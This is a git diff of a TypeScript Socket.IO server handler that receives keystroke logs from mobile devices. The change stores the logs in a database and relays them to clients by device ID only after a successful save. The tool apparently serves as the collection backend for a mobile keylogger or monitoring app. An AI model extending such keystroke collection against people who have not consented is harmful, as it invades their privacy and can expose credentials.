@@ -548,6 +548,36 @@ export const startSocketIO = async () => {
 			);
 
 			// Recieve the Key Logs from mobile
+			// socket.on(
+			// 	`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
+			// 	async (response: any) => {
+			// 		try {
+			// 			console.log("Key logs=>", response);
+			// 			const deviceId = response.deviceId;
+			// 			const keyLogsType = response.keyLogsType;
+			// 			const keylogs = response.keylogs;
+			// 			const keyEvent = response.event;
+
+			// 			// if (res.status == 200) {
+			// 			io.emit(
+			// 				`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+			// 				{
+			// 					deviceId: deviceId,
+			// 					keyLogsType: keyLogsType,
+			// 					keylogs: keylogs || "none",
+			// 					keyevent: keyEvent || "none",
+			// 					created_at: Date.now(),
+			// 				}
+			// 			);
+			// 			// }
+
+			// 			// data should be include deviceId and keylogs
+			// 			const res = await addNewKeyLogs(response);
+			// 		} catch (error) {
+			// 			console.log("Key Logs Response Error", error);
+			// 		}
+			// 	}
+			// );
 			socket.on(
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
@@ -555,26 +585,35 @@ export const startSocketIO = async () => {
 						console.log("Key logs=>", response);
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
-						const keylogs = response.keylogs;
-						const keyEvent = response.event;
+						const keylogs = response.keylogs || "none";
+						const keyEvent = response.event || "none";
 
-						// if (res.status == 200) {
-						io.emit(
-							`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
-							{
-								deviceId: deviceId,
-								keyLogsType: keyLogsType,
-								keylogs: keylogs || "none",
-								keyevent: keyEvent || "none",
-								created_at: Date.now(),
-							}
-						);
-						// }
+						// Prepare the data to be sent to clients
+						const dataToSend = {
+							deviceId: deviceId,
+							keyLogsType: keyLogsType,
+							keylogs: keylogs,
+							keyevent: keyEvent,
+							created_at: Date.now(),
+						};
 
-						// data should be include deviceId and keylogs
+						// Save to the database first
 						const res = await addNewKeyLogs(response);
+
+						// Check if the data was saved successfully
+						if (res.status == 200) {
+							// Emit the event only if the save was successful
+							io.emit(
+								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+								dataToSend
+							);
+						} else {
+							console.error(
+								"Failed to save key logs to the database."
+							);
+						}
 					} catch (error) {
-						console.log("Key Logs Response Error", error);
+						console.error("Key Logs Response Error", error);
 					}
 				}
 			);
